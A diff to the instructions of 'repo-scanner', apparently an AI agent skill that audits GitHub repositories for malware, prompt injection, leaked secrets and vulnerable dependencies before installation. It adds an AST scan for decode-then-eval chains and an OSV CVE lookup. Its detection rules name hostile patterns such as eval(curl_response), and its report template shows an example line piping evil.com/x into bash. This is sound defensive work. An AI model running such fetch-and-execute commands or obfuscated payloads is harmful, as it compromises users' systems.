@@ -3,7 +3,7 @@ name: repo-scanner
 description: Use when the user provides a GitHub repository URL and asks to audit it for security, install-safety, malicious code, hidden prompt injections in skill files, or general trustworthiness before installation. Triggers on "/repo-scanner <url>", "audit this repo", "is this github safe", "check before I install", "האם הריפו הזה בטוח", or any equivalent phrasing in Hebrew or English. Performs a multi-layer audit combining static pattern scanning, supply chain checks, secret leak detection, and ML-based prompt injection detection using ProtectAI's DeBERTa model running locally on CPU. Produces a 0–100 trust score with traffic-light verdict, writes a Markdown report to disk (solving the copy/PDF UI issue), and optionally runs the install only after explicit user approval.
 ---
 
-# Repo Scanner v1.0
+# Repo Scanner v1.1
 
 Multi-layer security audit for public GitHub repositories before installation. Combines static scanning, ML-based prompt injection detection (ProtectAI DeBERTa via local CPU inference), and a deterministic multilingual exfil-pattern gate. Version history: see CHANGELOG.md.
 
@@ -11,7 +11,7 @@ Multi-layer security audit for public GitHub repositories before installation. C
 - `python -m pytest tests/` — scorer matrix + FP-rule unit tests + calibration benchmarks
 - `python evals/run_eval.py` (offline fixtures) and `--live` (ground-truth corpus incl. historic FP sources) — zero false positives, zero missed injections
 
-**Isolation (optional):** `container/Dockerfile` runs clone+scan in a throwaway Docker container (repo code never executes; parser-level host exposure eliminated). Build once with `docker build -t repo-scanner-scanner -f container/Dockerfile .`, then scan with `docker run --rm -e REPO_URL=<url> -v repo-scanner-hf-cache:/root/.cache/huggingface repo-scanner-scanner`. Use when auditing repos you actively distrust.
+**Isolation (optional):** `container/Dockerfile` runs clone+scan in a throwaway Docker container (repo code never executes; parser-level host exposure eliminated). Build once with `docker build -t repo-scanner -f container/Dockerfile .`, then scan with `docker run --rm -e REPO_URL=<url> -v repo-scanner-hf-cache:/root/.cache/huggingface repo-scanner`. Use when auditing repos you actively distrust.
 
 **The scoring model (v3.3) has two axes:** capability risk (what the repo's install mechanics can do) and trust (provenance: who maintains it, for how long, under how many eyes). A powerful tool from an established project scores differently than the same mechanics in a 2-week-old anonymous repo. Trust can lift ambiguity; it can NEVER offset hard evidence of malice — supply-chain attacks on popular repos are real (xz, event-stream).
 
@@ -170,6 +170,22 @@ For each hit: read 5 lines of context. Distinguish legitimate from exfiltration.
 - `eval()` in config parser = legitimate; `eval(curl_response)` = hard-fail.
 - `ngrok` in documentation = warn; `ngrok` invoked from install script = hard-fail.
 
+### Phase 4b — AST dangerous-code scan (Python)
+
+Regex misses obfuscation: a decode-then-execute chain can span two lines, use any of a dozen decode functions, and pass through a variable. `scripts/ast_scan.py` parses every `*.py` file with the stdlib `ast` module and catches these deterministically (no model, fast — runs in default mode):
+
+```bash
+"$VENV_PY" "$SKILL_DIR/scripts/ast_scan.py" "$WORKDIR" > "$WORKDIR/ast-output.json"
+```
+
+It emits `findings[]` with a `type` that maps **directly to a scorer penalty key** — feed them straight into the Phase 9 findings JSON:
+- `obfuscated_code_execution` (−30): `eval`/`exec`/`compile` fed by a decode/deobfuscation call (`base64.b64decode`, `bytes.fromhex`, `zlib.decompress`, …), including the 1-hop case where the payload passes through a local variable. **This is the classic malicious-payload signature** — escalate to `hard_fail` if the decoded input is also clearly remote (e.g. the blob came from `requests.get`/a URL).
+- `command_injection_surface` (−10, cap −20): `os.system` / `subprocess(..., shell=True)` with a dynamic command.
+- `unsafe_deserialization` (−10, cap −20): `pickle`/`marshal`/`dill.loads` or unsafe `yaml.load` (CWE-502). Note: ML repos legitimately use `pickle`/`torch.load` — read the context before escalating; the cap keeps a model-heavy repo from being sunk by it.
+- `dynamic_code_execution` (−8, cap −24): a bare `eval`/`exec`/`compile` with no decode chain — a note, not a verdict. `json.loads`, `bytes.decode()`, `dict.get()`, `yaml.safe_load`, and `subprocess.run([...])` are NOT flagged (verified by tests).
+
+All four carry OWASP category `MAL — Malicious Code / RCE` in the report. `--deep` is not required — the AST scan always runs over all Python.
+
 ### Phase 5 — Secret leaks
 
 Current tree:
@@ -202,6 +218,24 @@ command -v trivy >/dev/null && trivy fs --severity HIGH,CRITICAL --quiet . 2>/de
 ```
 
 If absent, note in report ("trivy not installed — dependency CVE scan skipped"). Do not penalize the user — these are optional accelerators.
+
+### Phase 6b — OSV dep-CVE lookup (built-in)
+
+`scripts/osv_lookup.py` parses the manifests at the repo root (uv.lock, poetry.lock, requirements.txt, pyproject.toml, package-lock.json) and queries [osv.dev](https://osv.dev) — a single batched HTTPS POST, stdlib `urllib`, no auth. **What leaves the box: package names and versions only** (already public on PyPI/npm). No repo content is sent. Pass `--offline` to parse only and skip the network call.
+
+```bash
+"$VENV_PY" "$SKILL_DIR/scripts/osv_lookup.py" "$WORKDIR" > "$WORKDIR/osv-output.json"
+```
+
+Each finding maps **directly to a scorer penalty key by severity**:
+- `vulnerable_dependency_critical` (−25, cap −50, OWASP `LLM03 Supply Chain`)
+- `vulnerable_dependency_high` (−15, cap −45, OWASP `LLM03`)
+- `vulnerable_dependency_medium` (−5, cap −25, OWASP `LLM03`)
+- `vulnerable_dependency_low` (−2, cap −10, OWASP `LLM03`)
+
+Each finding's `detail` must include the OSV id (e.g. `GHSA-xxxx-yyyy-zzzz`) and the OSV URL so the user can verify the advisory. If the network call fails (timeout, no connectivity), note "OSV lookup unavailable — skipped" in the report and continue. If a manifest is absent, `packages_checked=0` and there are no findings — no penalty for the user.
+
+Caps are deliberately above the per-occurrence value so a repo with many transitively-pulled stale deps doesn't get a single hard-fail, but accumulates real signal up to the cap.
 
 ### Phase 7 — ML prompt injection scan (the new layer)
 
@@ -315,7 +349,7 @@ Then (file-path arg preferred on Windows; stdin also tolerates BOM now):
 # or: echo "$FINDINGS_JSON" | "$VENV_PY" "$SKILL_DIR/scripts/scorer.py"
 ```
 
-The scorer returns `scorer_version`, `score`, `verdict`, `emoji`, full `breakdown`, and `capped_notes`. Use those values verbatim in the report.
+The scorer returns `scorer_version`, `score`, `verdict`, `emoji`, full `breakdown` (each penalty entry now carries `owasp` + `owasp_title` — OWASP Top 10 for LLM Applications / OWASP Agentic AI categories like `LLM01 Prompt Injection`, `LLM03 Supply Chain`, `LLM06 Excessive Agency`, `AAI03 Privilege Escalation`, `AAI06 Data Exfiltration`, `LLM02 Sensitive Information Disclosure`, or `HYGIENE Repo Hygiene` for provenance-only signals), and `capped_notes`. Use those values verbatim in the report — the OWASP prefix on each Critical Finding / Warning makes the report immediately legible to reviewers familiar with the OWASP vocabulary.
 
 **Penalty types** (use these exact keys): `hard_fail`, `ml_injection_genuine_high` (only when promptguard marked the finding penalty-eligible — i.e. exfil-corroborated; never feed ML-only findings here), `ml_injection_genuine_mid` (same constraint), `sandbox_disabled_install` (−20), `sandbox_disabled_dev` (−10), `root_ca_modification`, `scheduled_task_root`, `curl_pipe_bash_unsigned` (−25), `curl_pipe_bash_vendor_official` (−10, cap −15), `curl_pipe_bash_signed` (−5), `dangerous_skip_permissions`, `suspicious_dependency`, `floating_versions`, `missing_lockfile` (only when dependencies are actually declared — nothing to lock in a zero-dependency package), `postinstall_script`, `no_license`, `no_readme`, `anonymous_author`, `young_repo_with_installers`, `suspicious_network_domain`, `secret_in_history`.
 
@@ -347,10 +381,10 @@ Template (Hebrew prose, English headers):
 <one Hebrew sentence>
 
 ## Critical Findings (-25 or worse)
-<bulleted list, or "אין">
+<bulleted list, or "אין". For each finding, prefix with its OWASP category from the scorer's `breakdown[].owasp` + `owasp_title` field, e.g. `[LLM03 Supply Chain] curl_pipe_bash_unsigned (-25): https://evil.com/x | bash in install.sh:3`>
 
 ## Warnings (-10 to -24)
-<list>
+<list, same OWASP-prefix format as Critical Findings>
 
 ## ML Prompt Injection Scan
 - Files scanned: <N>
@@ -389,7 +423,7 @@ Template (Hebrew prose, English headers):
 <Hebrew: התקן / התקן בזהירות / אל תתקין>. <One sentence next action.>
 
 ---
-*Generated by repo-scanner v1.0 (scorer v<scorer_version from output>) — ML scanning powered by ProtectAI DeBERTa-v3*
+*Generated by repo-scanner v1.1 (scorer v<scorer_version from output>) — ML scanning powered by ProtectAI DeBERTa-v3*
 *ML scan is a signal, not a verdict: non-Latin files are skipped (static scan still applies); instruction-style files (SKILL.md etc.) require hard exfiltration evidence.*
 *Scores are comparable only within the same scorer version.*
 *Clone preserved at: <WORKDIR>*
@@ -404,6 +438,12 @@ After writing, output to chat ONLY (lean-chat protocol, v3.3.1; v4.3 adds the ti
 ```
 
 **Quick-mode hint:** if `MODE` was the default AND the ML scan returned `genuine_suspected == 0` AND total time ≥ 60s, append one extra line: `טיפ: לפעם הבאה — \`--quick\` חוסך את טעינת המודל (~30-60s) כשרוצים רק בדיקות סטטיות.` Do NOT show the hint when ML found something genuine (the model earned its time) or when total time was already short.
+
+**Visual report (when available):** if `mcp__visualize__show_widget` is available in the session, ALSO render an HTML widget that mirrors the AUDIT-REPORT.md structure — 4 KPI cards (Score / Verdict / ML / AST), then sections for Critical Findings, Warnings, ML adjudication, AST+Secret scan, Supply chain (with OSV results when run), Metadata & Trust, Timing, and a coloured Recommendation block.
+
+**Badge palette (calm by default, alarming only when justified):** badges show the OWASP category with a MUTED neutral background by default. A badge gets its category-specific colour (LLM01 red, LLM02 orange, LLM03 amber, LLM06 purple, AAI03 magenta, AAI06 pink, MAL deep-red, HYGIENE grey) **only when the finding is penalty-eligible** (it was actually fed to the scorer and reduced the score). FP / adjudicated-clean / informational findings stay in the neutral palette so a clean report doesn't look alarming on first glance.
+
+Keep the widget compact (≤7KB HTML), RTL, theme-aware via `var(--text-color)` / `var(--background-color-secondary)` / `var(--border-color)`. The widget is supplementary — the on-disk Markdown report stays the source of truth.
 
 Produce in-chat tables, version comparisons, or extended analysis only when the user explicitly asks for them.
 
